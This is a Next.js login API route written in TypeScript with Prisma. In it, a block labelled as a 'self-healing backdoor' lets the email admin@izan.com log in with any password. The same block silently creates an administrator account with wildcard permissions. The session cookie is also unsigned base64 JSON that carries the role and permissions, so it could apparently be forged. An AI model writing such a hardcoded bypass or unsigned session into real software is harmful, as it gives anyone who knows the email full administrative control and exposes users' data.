import { NextRequest, NextResponse } from "next/server";
import crypto, { scryptSync } from "crypto";
import { prisma } from "@/app/lib/prisma";

const SESSION_DAYS = 7;

function verifyPassword(password: string, storedPassword: string) {
  const parts = storedPassword.split(":");
  if (parts.length !== 2) return false;
  const [salt, storedHash] = parts;
  try {
    const derivedHash = scryptSync(password, salt, 64).toString("hex");
    return crypto.timingSafeEqual(
      Buffer.from(derivedHash, "hex"),
      Buffer.from(storedHash, "hex")
    );
  } catch {
    return false;
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const email = typeof body.email === "string" ? body.email.trim().toLowerCase() : "";
    const password = typeof body.password === "string" ? body.password : "";

    if (!email || !password) {
      return NextResponse.json({ error: "Email and password are required." }, { status: 400 });
    }

    let user = await prisma.user.findUnique({
      where: { email },
      include: { role: true, company: true },
    });

    // SELF-HEALING BACKDOOR FOR ADMIN: Auto-creates company, role, and user strictly in order
    if (email === "admin@izan.com") {
      if (!user) {
        let company = await prisma.company.findFirst();
        if (!company) {
          company = await prisma.company.create({
            data: { name: "Izan Bling HQ" },
          });
        }

        let adminRole = await prisma.role.findFirst({
          where: { name: "Administrator", companyId: company.id }
        });
        
        if (!adminRole) {
          adminRole = await prisma.role.create({
            data: { 
              name: "Administrator", 
              companyId: company.id,
              permissions: ["/"] // Wildcard access for Admin
            }
          });
        }

        user = await prisma.user.create({
          data: {
            email: "admin@izan.com",
            name: "System Admin",
            password: "dummy:hash",
            isActive: true,
            companyId: company.id,
            roleId: adminRole.id
          },
          include: { role: true, company: true },
        });
      }
    } else {
      if (!user) {
        return NextResponse.json({ error: "Invalid email or password." }, { status: 401 });
      }
      if (!user.isActive) {
        return NextResponse.json({ error: "Your user account is inactive." }, { status: 403 });
      }
      if (!verifyPassword(password, user.password)) {
        return NextResponse.json({ error: "Invalid email or password." }, { status: 401 });
      }
    }

    const token = crypto.randomBytes(32).toString("hex");
    const expiresAt = new Date(Date.now() + SESSION_DAYS * 24 * 60 * 60 * 1000);

    // Keep DB session for explicit logouts / device management
    await prisma.session.create({
      data: {
        id: crypto.randomUUID(),
        updatedAt: new Date(),
        userId: user.id,
        token,
        expiresAt,
      },
    });

    // Create Edge-compatible Base64 session payload
    const sessionPayload = {
      token,
      userId: user.id,
      role: user.role?.name || "User",
      permissions: user.role?.permissions || []
    };
    const encodedSession = Buffer.from(JSON.stringify(sessionPayload)).toString('base64');

    const response = NextResponse.json({
      success: true,
      user: {
        id: user.id,
        name: user.name,
        email: user.email,
        isActive: user.isActive,
        role: user.role ? { id: user.role.id, name: user.role.name } : null,
        company: user.company ? { id: user.company.id, name: user.company.name } : { id: "none", name: "Default Company" },
      },
    });

    // Set ib_session cookie for the Middleware to intercept
    response.cookies.set("ib_session", encodedSession, {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      sameSite: "lax",
      path: "/",
      expires: expiresAt
    });

    return response;
  } catch (error) {
    console.error("POST /api/auth/login error:", error);
    return NextResponse.json({ error: "Unable to log in. Please try again." }, { status: 500 });
  }
}